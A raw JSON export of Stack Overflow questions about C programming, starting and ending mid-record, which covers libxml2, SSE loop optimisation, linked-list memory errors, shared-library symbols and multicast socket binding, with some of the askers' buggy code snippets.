view?</p>\n"},{"tags":["c","static-analysis","lint","splint"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13178263,"title":"Taint Analysis for C","body":"<p>I need to perform static taint analysis on my C program. I tried using Splint, no luck. Are there any other open source or freeware tools that are available to perform taint analysis?</p>\n\n<p>If yes, can you please also mention about the way to use it or refer to any link. Appreciate your help. Thanks</p>\n"},{"tags":["objective-c","ios","c","arm"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":4,"view_count":95,"score":-4,"question_id":13166055,"title":"How do I get started with ARM on iOS?","body":"<p>Just curious as to how to get started understanding ARM under iOS. Any help would be super nice. </p>\n"},{"tags":["c","libxml2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13165554,"title":"libxml2: Not report characters like ' or \" individually","body":"<p>I'm new to libxml and so far everything is good, but I noticed one thing that annoys me:\nWhen libxml reports characters, i.e. the handler's characters function is being called, \"special\" characters like ' or \" or reported individually.\nexample: </p>\n\n<pre><code>\"It's a nice day today. Don't you agree?\"\nreport:\"\nreport: It\nreport: '\nreport: s a nice day today. Don\nreport: '\nreport: you aggree?\nreport: \"\n</code></pre>\n\n<p>Is there any way to change that behavior, so it would be reported as a complete string?\nDon't get me wrong, it's not a problem to use strcat to put the original string together, but that's additional work ;)</p>\n\n<p>I searched the headers and the net and found no solution. Thank you in advance.</p>\n\n<p>Edit: Because the handler description above needs some more explaining.\nBy reporting characters I mean when the handler's (htmlSAXHandler)  handler.characters callback function is called, which I assigned:</p>\n\n<pre><code>void _characters(void *context, const xmlChar *ch, int len) {\n    printf(\"report: %s\\n\", chars);\n}\n</code></pre>\n"},{"tags":["c","network-programming"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":13169734,"title":"What is the best way to design a server for performance?","body":"<p>I am trying to create a server which I expect to have high performance demands. This question deals with the server core. What programming ideas best support fast performance?</p>\n\n<ol>\n<li>Do you split sockets into different threads and call blocking recv() on each?</li>\n<li>Do you have one thread which sits in a select() loop and then notifies another thread to process the individual ports?</li>\n<li>Do you have one thread which processes the select() and the response?</li>\n<li>Do you do 2 or 3 but with clusters of ports instead of all of them?</li>\n<li>Does using blocking vs nonblocking ports matter if you use select as specified above?</li>\n<li>What setsockopt's improve performance: TCP_NODELAY, others?</li>\n</ol>\n\n<p>I realize that some of these depend on the use case. For example, 6 with TCP_NODELAY off would have a negative impact if there are a lot of small packets. 3 sounds like it might be faster if the response is trivial. Any other questions that I havent thought of that affect performance would be appreciated as well.</p>\n"},{"tags":["c++","c","windows","dll","pcre"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13163318,"title":"Error with msvcrt.dll and pcre library [SOLVED]","body":"<p>I wrote a C program and works fine on Windows 7 and Linux, but when I execute it on Windows XP I get the error:</p>\n\n<pre><code>\"_except_handler4_common could not be located in the dynamic link library msvcrt.dll\"\n</code></pre>\n\n<p>I researched it and some people said to delete the DLL \"dwmapi.dll\" which I don't have, so that's not my problem.</p>\n\n<p>Some one told me to use <code>depends walker(depends.exe)</code> to find who is using <code>msvcrt.dll</code>. I did and find that <code>pcre</code> library is using it and there actually is a problem with it, but I don't have any idea how to solve this. Can any one help me?</p>\n\n<p>Here's image of what depends walker show me:</p>\n\n<p><a href=\"http://img507.imageshack.us/img507/29/dependsr.png\" rel=\"nofollow\">http://img507.imageshack.us/img507/29/dependsr.png</a></p>\n\n<p>[SOLUTION]</p>\n\n<p>Hi, \nThanks everyone for the help and just to let you know what I did to solve the problem:</p>\n\n<p>the problem was with the pcre3.dll, as i've told before, and i simply change the version of it, I was using the version 7.x and change to 4.4 that calls pcre.dll instead of pcre3.dll, that solve my problem if any one have the same issue.</p>\n\n<p>here is the link to the correct lib:\n<a href=\"http://www.psyon.org/projects/pcre-win32/pcre-4.4-dll.zip\" rel=\"nofollow\">pcre-4.4-dll.zip</a></p>\n"},{"tags":["c","embedded","libc","freertos"],"answer_count":7,"favorite_count":4,"up_vote_count":13,"down_vote_count":0,"view_count":1589,"score":13,"question_id":4921553,"title":"Small libc for embedded systems","body":"<p>I am looking for a small libc for embedded use with freertos on a ARM7 microcontroller.\nI have looked at newlib, but it is a bit too complex for my needs. Newlib calls malloc() in\na number of functions (e.g. printf()), which is not good for small embedded realtime systems.</p>\n\n<p>Does anyone know of a small, portable, open source libc implementation that will fit my application?</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":13177753,"title":"If I declare a semaphore in a malloc'd struct and I free() the struct do i still need to destroy the semaphore?","body":"<p>Pertaining to C programming.</p>\n\n<p>Suppose i do this:</p>\n\n<pre><code>struct myStruct\n{\n    pthread_mutex_t myMutex;\n    sem_t mySemaphore;\n};\n</code></pre>\n\n<p>`</p>\n\n<p>And i malloc the appropriate size and initialize the Semaphore:</p>\n\n<pre><code>myStruct *create_myStruct()\n{\n    myStruct *temp; \n\n    temp = (myStruct *) malloc(sizeof(myStruct));\n    sema_init(&amp;sema, 0, 0);\n    pthread_mutex_init(&amp;(temp-&gt;myMutex), NULL);\n    return temp;\n}\n</code></pre>\n\n<p>Do I still need to manually destroy the semaphore or just calling free will do?</p>\n"},{"tags":["c++","c","linux","linux-kernel","daemon"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":3,"view_count":808,"score":0,"question_id":10543280,"title":"Linux daemon tutorial","body":"<p>I'm new to Daemon. I'm good in C/C++. Can you give me any tutorial location of Linux Daemon on the web? Or any kind of suggestion is appreciated.</p>\n"},{"tags":["c","winapi","windows-8"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":250,"score":3,"question_id":12076140,"title":"Can't set clock using SetSystemTime on Windows 8","body":"<p>My app uses <code>SetSystemTime()</code> to set the PC clock from a GPS source.  This works fine in Windows 7 with User Account Control disabled, but in Windows 8, even with UAC disabled, it fails.  The error I get back is <code>ERROR_PRIVILEGE_NOT_HELD</code>.  The user logged into the machine is in the Administrators group.  I can only get it to work if I run the application as \"Run as Administrator\" from the file's context menu in Explorer - but the logged-in user IS an Administrator.</p>\n\n<p>So... what do I need to do differently on Windows 8 to get <code>SetSysytemTime()</code> to work?  Do I need even more elevated privileges than the current users' Administrator rights?  If so, what has higher privileges than Administrator?  Or do I need to set the user account up differently to allow these kinds of calls to work on Windows 8?</p>\n\n<p>EDIT: As noted in the comments, manually attempting to enable the <code>SE_SYSTEMTIME_NAME</code> privilege doesn't work.  Neither does trying to add the privilege using the suggested MSDN method of <code>LsaAddAccountRights</code>.</p>\n"},{"tags":["c","optimization","assembly","compiler-optimization","micro-optimization"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":130,"score":1,"question_id":13176470,"title":"Persuading the compiler to set registers outside a loop","body":"<p>Firstly, I will prefix this by saying I don't think it is necessary to understand the functioning of the code below to make a sensible attempt to solve my problem. This is primarily an optimisation problem. The code is to understand what is being done.</p>\n\n<p>I have the following somewhat optimised convolution main loop (which works):\n</p>\n\n<pre><code>for(int i=0; i&lt;length-kernel_length; i+=4){\n\n    acc = _mm_setzero_ps();\n\n    for(int k=0; k&lt;KERNEL_LENGTH; k+=4){\n\n        int data_offset = i + k;\n\n        for (int l = 0; l &lt; 4; l++){\n\n            data_block = _mm_load_ps(in_aligned[l] + data_offset);\n            prod = _mm_mul_ps(kernel_reverse[k+l], data_block);\n\n            acc = _mm_add_ps(acc, prod);\n        }\n    }\n    _mm_storeu_ps(out+i, acc);\n\n}\n</code></pre>\n\n<p><code>KERNEL_LENGTH</code> is 4.\n<code>in_aligned</code> is the input array (upon which the convolution is performed) repeated 4 times, with each repeat being shifted one sample to the left from the others. This is so every sample can be found on a 16-byte aligned location.\n<code>kernel_reverse</code> is the reversed kernel, with every sample repeated 4 times to fill a 4-vector and is declared and defined as:</p>\n\n<pre><code>float kernel_block[4] __attribute__ ((aligned (16)));\n__m128 kernel_reverse[KERNEL_LENGTH] __attribute__ ((aligned (16)));    \n\n// Repeat the kernel across the vector\nfor(int i=0; i&lt;KERNEL_LENGTH; i++){\n    kernel_block[0] = kernel[kernel_length - i - 1];\n    kernel_block[1] = kernel[kernel_length - i - 1];\n    kernel_block[2] = kernel[kernel_length - i - 1];\n    kernel_block[3] = kernel[kernel_length - i - 1];\n\n    kernel_reverse[i] = _mm_load_ps(kernel_block);\n}\n</code></pre>\n\n<p>The code computes the algorithm correctly and pretty quickly too.</p>\n\n<p>I compile the code with <code>gcc -std=c99 -Wall -O3 -msse3 -mtune=core2</code></p>\n\n<p>My question is this:\nThe loop is compiled to the machine code below. Inside this loop, a not-insignificant number of instructions are spent loading the kernel every time. The kernel does not change on each iteration of the loop and so can, in principle, be kept in SSE registers. As I understand it, there are sufficient registers to easily store the kernel (and indeed, the machine code doesn't suggest too much register pressure).</p>\n\n<p>How do I persuade the compiler to not load the kernel on every loop?</p>\n\n<p>I was expecting the compiler to do this automatically when the kernel length was set to be constant.</p>\n\n<pre><code>    testl   %edx, %edx\n    jle .L79\n    leaq    (%rcx,%rcx,2), %rsi\n    movaps  -144(%rbp), %xmm6\n    xorps   %xmm2, %xmm2\n    leal    -1(%rdx), %ecx\n    movaps  -128(%rbp), %xmm5\n    xorl    %eax, %eax\n    movaps  -112(%rbp), %xmm4\n    leaq    0(%r13,%rsi,4), %rsi\n    shrl    $2, %ecx\n    addq    $1, %rcx\n    movaps  -96(%rbp), %xmm3\n    salq    $4, %rcx\n    .p2align 4,,10\n    .p2align 3\n.L80:\n    movaps  0(%r13,%rax), %xmm0\n    movaps  (%r14,%rax), %xmm1\n    mulps   %xmm6, %xmm0\n    mulps   %xmm5, %xmm1\n    addps   %xmm2, %xmm0\n    addps   %xmm1, %xmm0\n    movaps  (%r9,%rax), %xmm1\n    mulps   %xmm4, %xmm1\n    addps   %xmm1, %xmm0\n    movaps  (%rsi,%rax), %xmm1\n    mulps   %xmm3, %xmm1\n    addps   %xmm1, %xmm0\n    movups  %xmm0, (%rbx,%rax)\n    addq    $16, %rax\n    cmpq    %rcx, %rax\n    jne .L80\n.L79:\n</code></pre>\n\n<p>Edit: the full code listing is as follows:</p>\n\n<pre><code>#define KERNEL_LENGTH 4\nint convolve_sse_in_aligned_fixed_kernel(float* in, float* out, int length,\n        float* kernel, int kernel_length)\n{\n    float kernel_block[4] __attribute__ ((aligned (16)));\n    float in_aligned[4][length] __attribute__ ((aligned (16)));\n\n    __m128 kernel_reverse[KERNEL_LENGTH] __attribute__ ((aligned (16)));    \n    __m128 data_block __attribute__ ((aligned (16)));\n\n    __m128 prod __attribute__ ((aligned (16)));\n    __m128 acc __attribute__ ((aligned (16)));\n\n    // Repeat the kernel across the vector\n    for(int i=0; i&lt;KERNEL_LENGTH; i++){\n        int index = kernel_length - i - 1;\n        kernel_block[0] = kernel[index];\n        kernel_block[1] = kernel[index];\n        kernel_block[2] = kernel[index];\n        kernel_block[3] = kernel[index];\n\n        kernel_reverse[i] = _mm_load_ps(kernel_block);\n    }\n\n    /* Create a set of 4 aligned arrays\n     * Each array is offset by one sample from the one before\n     */\n    for(int i=0; i&lt;4; i++){\n        memcpy(in_aligned[i], (in+i), (length-i)*sizeof(float));\n    }\n\n    for(int i=0; i&lt;length-kernel_length; i+=4){\n\n        acc = _mm_setzero_ps();\n\n        for(int k=0; k&lt;KERNEL_LENGTH; k+=4){\n\n            int data_offset = i + k;\n\n            for (int l = 0; l &lt; 4; l++){\n\n                data_block = _mm_load_ps(in_aligned[l] + data_offset);\n                prod = _mm_mul_ps(kernel_reverse[k+l], data_block);\n\n                acc = _mm_add_ps(acc, prod);\n            }\n        }\n        _mm_storeu_ps(out+i, acc);\n\n    }\n\n    // Need to do the last value as a special case\n    int i = length - kernel_length;\n    out[i] = 0.0;\n    for(int k=0; k&lt;kernel_length; k++){\n        out[i] += in_aligned[0][i+k] * kernel[kernel_length - k - 1];\n    }\n\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","gcc","compiler-errors"],"answer_count":3,"favorite_count":2,"up_vote_count":15,"down_vote_count":2,"view_count":204,"score":13,"question_id":13068619,"title":"Inverted arguments in scanf()","body":"<p>I was (quickly) writing some code and accidently inverted the arguments in <code>scanf()</code>:</p>\n\n<pre><code>char i[] = \"ABC1\\t\";\nscanf(i, \"%s\");\n</code></pre>\n\n<p>Compiling with <code>gcc -Werror -Wall -Wextra</code> doesn't complain about this one bit. Obviously, this code doesn't work, but why didn't gcc inform me that I inverted the arguments? Can't it detect that <code>i</code> is not a format string, or that the second argument was not a store-able type?</p>\n\n<p><strong>EDIT</strong><br>\nThanks for the insight all, Looks like I found the answer, there was a twist on the <code>-Wformat</code> flag that makes this \"catchable\" (posted it below for reference)</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13176142,"title":"client and server + sorting","body":"<p>In my program, I'm getting username as startup parameter and getting the user-id from server. \nSever and client are connected! \nBut I need to put the username and the user-id(that belongs to the username) together, send them back to the server and to the end sort them with respect to user-ids. Any suggestions? </p>\n"},{"tags":["c","memory-management","malloc"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":13176341,"title":"Storing an integer and bit in a single word","body":"<p>I was reading through a <a href=\"http://courses.engr.illinois.edu/cs241/sp2012/lectures/09-malloc.pdf\" rel=\"nofollow\">presentation on the implementation of malloc</a>, and on slide 7 it suggests storing a regions size and availability in a single word to save space. The alternative is to use two words, which is wasteful as the availability bit only needs to be 0 or 1.</p>\n\n<p>This is the given explanation:</p>\n\n<ul>\n<li>If blocks are aligned, low-order address bits are always 0</li>\n<li>Why store an always-0 bit?</li>\n<li>Use it as allocated/free flag! When reading size word, must mask out this bit</li>\n</ul>\n\n<p><a href=\"http://courses.engr.illinois.edu/cs241/sp2012/lectures/09-malloc.pdf\" rel=\"nofollow\">http://courses.engr.illinois.edu/cs241/sp2012/lectures/09-malloc.pdf</a></p>\n\n<p>But I'm not really understanding how this works and how it could be implemented in C. Why is one bit of the size integer always 0?</p>\n"},{"tags":["c","database","software-engineering","file-handling"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":62,"score":2,"question_id":13176412,"title":"Which database is most easy to use with C language?","body":"<p>I have a project to be made on \"college counseling and admission\" in C language and I'm confused whether to choose a database or the file management system in C for the data.\nAs I have no prior knowledge of connecting C with any of the databases around and also because I find the file handling in C some what difficult.</p>\n\n<p>What would you recommend?</p>\n"},{"tags":["c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":130,"score":-3,"question_id":13175416,"title":"str_cat,str_cpy","body":"<p>I got a  little challenge to implement:</p>\n\n<ul>\n<li>Look at main(): it calls various functions.</li>\n<li>You are asked to implement two functions: str_cpy() and str_cat(). No need to implement str_printf() and str_free() </li>\n<li>Reading main() carefully will allow to understand str_cpy() and str_cat() signature and usage.</li>\n<li>The code you write needs to be \"library quality\"; as good as you would expect a good libc to implement such functions.</li>\n<li>At the top of the page, you see 4 includes - indicating the functions that can be used to implement str_cpy() and str_cat().</li>\n<li>FYI: it is possible to implement str_cpy() and str_cat() efficiently in no more than 7 lines of code per function, and in less than 5 minutes.</li>\n</ul>\n\n<p>So I implement it and i think it works fine ( I debugged it and checked several times) </p>\n\n<p>my implementation:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdarg.h&gt;\n\nvoid str_cpy(char **dst,char *src){\nint i=0;\nchar **dst1;\ndst1=(char**)malloc(sizeof(char*));\n*dst1=(char*)malloc(strlen(src)+1);      // asume that allocation will always work\n//strcpy(*dst,src);\nwhile(*(src+i)!='\\0'){\n    *(*dst1+i)=*(src+i);\n    i++;\n}\n*(*dst1+i)='\\0';\nfree(*dst);\n*dst=*dst1;\nfree(dst1);\n}\n\nvoid str_cat(char **dst,char *src){\n//strcat(*dst,src);\nint i=0;\nint n=strlen(*dst);\n*dst=(char*)realloc(*dst,n+strlen(src)+1);  // asume that allocation will always work\nwhile(*(src+i)!='\\0'){\n    *(*dst+n+i)=*(src+i);\n    i++;\n}\n*(*dst+n+i)='\\0';\n}\n\nint main(int argc, char *argv[])\n{\nchar *s = NULL;\nstr_cpy(&amp;s, \"Hola Hola\");\nstr_cpy(&amp;s, s+5);\nstr_cat(&amp;s, \" Mundo\");\n//str_printf(&amp;s, \"%s!\", s);\nputs(s); /* result: \"Hola Mundo\" */\n//str_free(&amp;s);\nsystem(\"pause\");\nreturn 0;\n</code></pre>\n\n<p>}</p>\n\n<p>I sent my solution and first response that i got that my solution simply not good enough,\nSo i asked a little more information why it is not good and that what i got:</p>\n\n<p>Your solution failed our challenge because it crashes (\"Segmentation\nFault\" error) on the challenge's main() example </p>\n\n<p>and they won't tell me any more.</p>\n\n<p>I debugged my code. I use Visual studio 2008.It works good!!!\nI will really appreciate if some body will give me a clue at which direction to think and why it fails? </p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":118,"score":-1,"question_id":13175157,"title":"Which is the best way to represent power of negative values","body":"<p>I want to use C program to calculate permitivity of some materiel. The formula to calculate permitivity is </p>\n\n<pre><code>E= Cx/Co;\nCo= 15.88pF = 15.88*10^-12;\nCx=1/W.C;\nW= 2*pi*f=2*pi*250000;\nC= Cs/(1+tan^2(theta));\nCs=1;\ntheta=0 degree;\n</code></pre>\n\n<p>I have tried to implement the above formula in C with the fallowing code.</p>\n\n<pre><code>float E, Cx, Co= 15.88*10^-12;, Cs=1.0; f=250*10^3,Pi=3.14,theta=0.0;\n\nangle= theta/180*pi;  // to convert degree to radians\nW= 2*pi*f;\nC= Cs/(1+tan^2(angle));\nCx=1/W.C;\nE= Cx/Co;\n\nprintf(\"permitivity value: %.10f\",E);\n</code></pre>\n\n<p>I am confusing in the representation of power values like </p>\n\n<blockquote>\n  <p>10^-12, tan^2(angle).                                                                   </p>\n</blockquote>\n\n<p>Is it correct the way I represent? I am not getting exact value what I have calculated with manually. Is there any better way to represent power values? I want to display float value 10 digits after point, like 0.0000000000. But i am able to display only six digits after point. </p>\n\n<p>Any one help me with the correct way to calculate permitivity. </p>\n"},{"tags":["c","api","shared-libraries","static-libraries","exposed"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":62,"score":3,"question_id":13174078,"title":"Expose only required functions in C","body":"<p>I am writing a small API library sort of module in C. I will compile this module and give it to my fellow developers and I will expose some required functions in header file of my module so developers who will use my module know which function to call for required functionality. Now I want to inquire one thing: Can I expose only desired functions in C. e.g.</p>\n\n<p>I have test.c having:</p>\n\n<pre><code>#include \"test.h\"\nvoid A()\n{\n  if( some condition is true )\n    B();\n  else\n   return;\n}\n\nvoid B()\n{\n  //some code here\n}\n</code></pre>\n\n<p>and in test.h, I have only one function exposed i.e.</p>\n\n<pre><code>void A();\n</code></pre>\n\n<p>Now B() clearly is dependent on condition put in A() otherwise it can not be run and as only A() is exposed in test.h then user wont know that he/she can also directly call B(). Now my fear is that if user gets to know (or by guess) that there is some function in my module called B() which can be called directly by bypassing A(), then it can compromise my implementation.</p>\n\n<p>I know that C++ would be better in this case because of public and private methods and I also have an idea that I can prevent B() being called directly by using some flag check of A() in B() but I want to know if there is any other method so that user cant call my functions (like B()) which are not exposed in header file.</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["c","linked-list"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13173192,"title":"C Devoweller memory error","body":"<p>I have almost completed my devowelling program for class but have encountered the memory access violation error when it reaches a while loop where I have tried to detect the absence of vowels from a linked list node. I realise that the way I have done this is ridiculously inefficient (many logical OR checks) but I was struggling with other ways to do this. Utterly confused. Not expecting too much help but any pointers (:S) would be greatly appreciated.</p>\n\n<p><a href=\"https://gist.github.com/3992412\" rel=\"nofollow\">https://gist.github.com/3992412</a></p>\n\n<p>Or, copy'n'paste:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;stdlib.h&gt;\n\nstruct NODE {\n char letter;\n struct NODE *next;\n};\n\nint vowelcheck(struct NODE *llist, int num);\nvoid addnode(struct NODE *llist, char c);\nvoid showsentence(struct NODE *llist);\nvoid devowel(struct NODE *llist);\n\nint main(void) {\n char charin;\n int input = 1;\n struct NODE *llist;\n int nodeno = 0;\n llist = (struct NODE *)malloc(sizeof(struct NODE));\n llist-&gt;letter = 0;\n llist-&gt;next = NULL;\n\n while(input != 0) {\n  printf(\"\\n\\n --Disemvoweler--\\n\");\n  printf(\"(0) Quit\\n\");\n  printf(\"(1) Enter sentence\\n\");\n  printf(\"(2) Disemvowel\\n\");\n  printf(\"(3) Display parsed sentence\\n\");\n  scanf(\"%d\", &amp;input);\n\n  switch(input) {\n   case 0: //exit\n   default:\n    printf(\"Exiting\\n\");\n    break;\n   case 1: //sentence input\n    printf(\"\\nEnter sentence, finish sentence with full stop (.) :\\n\");\n     do\n     {\n      charin=getchar();\n      addnode(llist, charin);\n     }\n     while (charin != '.');\n    break;\n   case 2: //remove vowels\n    printf(\"Your choice: `Disembvowel'\\n\");\n    while(llist-&gt;next != NULL) {\n     devowel(llist);\n     llist = llist-&gt;next;\n    }\n    printf(\"Disembvoweled!\\n\");\n    break;\n   case 3: //show sentence in memory (devoweled or not)\n    printf(\"\\n Parsed sentence: \\n\");\n    showsentence(llist);\n    break;\n   }\n  }\n\n free(llist);\n return(0);\n}\n\nvoid showsentence(struct NODE *llist) {\n while(llist-&gt;next != NULL) { //while not the last link (ie not full stop)\n  printf(\"%c \", llist-&gt;letter); //print letter\n  llist = llist-&gt;next; //move to next link\n }\n}\n\nvoid addnode(struct NODE *llist, char charin) {\n while(llist-&gt;next != NULL)\n llist = llist-&gt;next;\n llist-&gt;next = (struct NODE *)malloc(sizeof(struct NODE));\n llist-&gt;next-&gt;letter = charin;\n llist-&gt;next-&gt;next = NULL;\n}\n\nvoid devowel(struct NODE *llist) {\n struct NODE *temp;\n temp = (struct NODE *)malloc(sizeof(struct NODE));\nif(llist-&gt;letter == 'A' || llist-&gt;letter == 'a' || llist-&gt;letter == 'E' || llist-&gt;letter == 'e' || llist-&gt;letter == 'I' || llist-&gt;letter == 'i' || llist-&gt;letter == 'O' || llist-&gt;letter == 'o' || llist-&gt;letter == 'U' || llist-&gt;letter == 'u')\n{\n  /* remove the node */\n  temp = llist-&gt;next;\n  free(llist);\n  llist = temp;\n } else {\n  while(llist-&gt;next-&gt;letter != 'A' || llist-&gt;next-&gt;letter != 'a' || llist-&gt;next-&gt;letter != 'E' || llist-&gt;next-&gt;letter != 'e' || llist-&gt;next-&gt;letter != 'I' || llist-&gt;next-&gt;letter != 'i' || llist-&gt;next-&gt;letter != 'O' || llist-&gt;next-&gt;letter != 'o' || llist-&gt;next-&gt;letter != 'U' || llist-&gt;next-&gt;letter != 'u')\n    llist = llist-&gt;next;\n    temp = llist-&gt;next-&gt;next;\n    free(llist-&gt;next);\n    llist-&gt;next = temp;\n }\n}\n</code></pre>\n"},{"tags":["c++","python","c","unix","linker"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13173860,"title":"Undefined symbol error while loading .so file in python script","body":"<p>I have some C++ code, for which i have created a .so file.</p>\n\n<p>My objective is to load this .so file in a python script.</p>\n\n<p>In order to expose the C++ methods, i create a C wrapper method for them and expose the C method.</p>\n\n<p>However, when trying to load the .so file in python script, it gives me an Undefined symbol error.</p>\n\n<p>These errors are for methods that are used internally in some of the C++ classes and are not exposed out of the .so file. (nm -C -u .so)</p>\n\n<ol>\n<li>Aren't the names resolved when a .so file is created ?</li>\n<li>what is the best approach to resolve undefined symbols in .so file.</li>\n</ol>\n\n<p>E.g. : </p>\n\n<pre><code>C++ :\nclass myclass {\npublic:\n     void func1(int _i);\n     int getval();\n};\n\nC wrapper :\nextern \"C\" int getval_w();\n\nint getval_w() {\n    myclass obj;\n    return obj.getval();\n}\n</code></pre>\n\n<p>So, when i compile this code in a .so file and load that in a python script i get error like :\nUndefined symbol : \"mangled name for func1\"</p>\n"},{"tags":["c","gcc","embedded","arm"],"answer_count":2,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":149,"score":8,"question_id":13157352,"title":"Differences between -O0 and -O1 in GCC","body":"<p>While compiling some code I noticed big differences in the assembler created between -O0 and -O1. I wanted to run through enabling/disabling optimisations until I found out what was causing a certain change in the assembler.</p>\n\n<p>If I use -fverbose-asm to find out exactly which flags O1 is enabling compared to O0, and then disable them manually, why is the assembler produced still so massively different? Even if I run gcc with O0 and manually add all the flags that fverbose-asm said were enabled with O1, I don't get the same assembler that I would have got just by using O1.</p>\n\n<p>Is there anything apart from '-f...' and '-m...' that can be changed? </p>\n\n<p>Or is is just that 'O1' has some magic compared with 'O0' that cannot be turned off.</p>\n\n<hr>\n\n<p>Sorry for the crypticness - this was related to <a href=\"http://stackoverflow.com/questions/13155421/reducing-stack-usage-during-recursion-with-gcc-arm\">Reducing stack usage during recursion with GCC + ARM</a> however the mention of it was making the question a bit hard to understand.</p>\n"},{"tags":["c","linker","gnu","disassembling","object-files"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13174304,"title":"Differences in disassembly of an object and executable file","body":"<p>Basically, I used <code>objdump -D</code> to dis-assemble an object file and an ELF file. The major difference I see between the two is that. </p>\n\n<p>I see the instructions in the object file (of the individual segments) have an address that starts with <strong>0</strong>. Hence the consecutive addresses of are <strong>offset</strong> by a certain value, probably depending upon the <strong>length of the op-code</strong> corresponding to that specific instruction.</p>\n\n<pre><code>Disassembly of section .text:\n00000000 &lt;main&gt;:\n0:   8d 4c 24 04             lea    0x4(%esp),%ecx\n4:   83 e4 f0                and    $0xfffffff0,%esp\n7:   ff 71 fc                pushl  -0x4(%ecx)      \na:   55                      push   %ebp            \n</code></pre>\n\n<p>On the other hand, for an ELF fine I see a <strong>32-bit address space</strong> for the instructions.Also If I print the address of <code>main</code> in my program. It is equivalent to the address in my dis-assembled ELF.</p>\n\n<pre><code>08048394 &lt;main&gt;:\n8048394:       8d 4c 24 04             lea    0x4(%esp),%ecx\n8048398:       83 e4 f0                and    $0xfffffff0,%esp\n804839b:       ff 71 fc                pushl  -0x4(%ecx)\n804839e:       55                      push   %ebp\n</code></pre>\n\n<p>The questions here are.</p>\n\n<ul>\n<li>What does the addresses in ELF file actually refer to?</li>\n<li>How does the linker compute them?</li>\n</ul>\n"},{"tags":["c","linux","matlab"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":62,"score":3,"question_id":13168498,"title":"How to export data from C to MATLAB (on different machines)","body":"<p>I am generating long double float data in a C program on a Linux cluster. I need to export the data to Matlab, which is not installed on the cluster.</p>\n\n<p>What is the best way? My advisor says to export using <code>printf</code> statements. I assume he means sending the data to a comma separated file (and <code>fprintf</code>). But it seems to me like that could be slow and use too much memory and we may lose a lot of precision.</p>\n\n<p>I've found <a href=\"http://www.mathworks.com/help/matlab/programming-interfaces-for-c-c-fortran-com.html\" rel=\"nofollow\">this web page</a> for reading and writing .MAT files, but I don't really understand the page, or <a href=\"http://www.mathworks.com/help/matlab/matlab_external/creating-a-mat-file-in-c.html\" rel=\"nofollow\">the example</a>, which I copied to my cluster, but cannot compile (because it's missing libraries which, obviously, come from MATLAB.</p>\n\n<p><em>What is the best, or easiest, or fastest way to export data from Linux/C to Windows/MATLAB? How do I get started with that method?</em> Be advised when you answer that I am pretty new to C and will likely need help figuring out how to obtain, install, configure, and link any libraries. But once that's done, I think I'm pretty good at learning to use them.</p>\n"},{"tags":["c","arrays","malloc","heap","calloc"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13174054,"title":"How long does Linux take to clear the heap memory","body":"<p>I was wondering... suppose I've dynamically allocated an array like </p>\n\n<pre><code>array = calloc(n, sizeof(float));\n</code></pre>\n\n<p>or something similar. And also if n is a really large number, (~ 1 million, for arguments sake), how long would Linux take to clear the heap memory if I didn't <code>free()</code> it at the end? I know any OS would go around and clear un-freed and unused heap memory areas. But I assume how long it takes to do that is OS dependent.</p>\n"},{"tags":["c","sockets","interface","udp","multicast"],"answer_count":3,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":216,"score":5,"question_id":12681097,"title":"C - choose interface for UDP/multicast socket","body":"<p>I am trying to modify a <a href=\"http://ntrg.cs.tcd.ie/undergrad/4ba2/multicast/antony/example.html\" rel=\"nofollow\">multicast listener / sender example</a> to bind the UDP / multicast socket to a specific interface and <em>not</em> using the <strong>INADDR_ANY</strong> macro.</p>\n\n<p>I possess the IPv4 address of the interface.\nI tried the following, but the socket does not receive any UDP (unicast, broadcast, multicast) packets.</p>\n\n<pre><code>struct sockaddr_in addr;\nint fd, nbytes;\nsocklen_t  addrlen;\nstruct ip_mreq mreq;\n\n// my_ipv4Addr equals current IP as String, e.g. \"89.89.89.89\"\n\n// create what looks like an ordinary UDP socket */\nif ((fd = socket(AF_INET, SOCK_DGRAM, 0)) &lt; 0) {\n    perror(\"socket\");\n    exit(1);\n}\n\n// set up addresses\nbzero(&amp;addr, sizeof(addr));\naddr.sin_family = AF_INET;\n// [-]    addr.sin_addr.s_addr = htonl(INADDR_ANY); \naddr.sin_addr.s_addr = inet_addr(my_ipv4Addr); \naddr.sin_port = htons(port);\n\n// bind socket\nif 